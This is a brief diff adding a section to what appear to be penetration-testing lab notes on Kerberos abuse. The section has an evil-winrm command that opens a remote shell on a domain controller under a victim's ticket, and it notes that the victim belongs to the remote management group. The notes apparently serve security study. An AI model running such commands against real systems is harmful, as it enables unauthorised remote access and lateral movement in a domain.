@@ -28,6 +28,11 @@ klist
 
 
 
+# using the rights of the victim
+```
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+- in this case the victim has the right `remote management group`
 
 
 
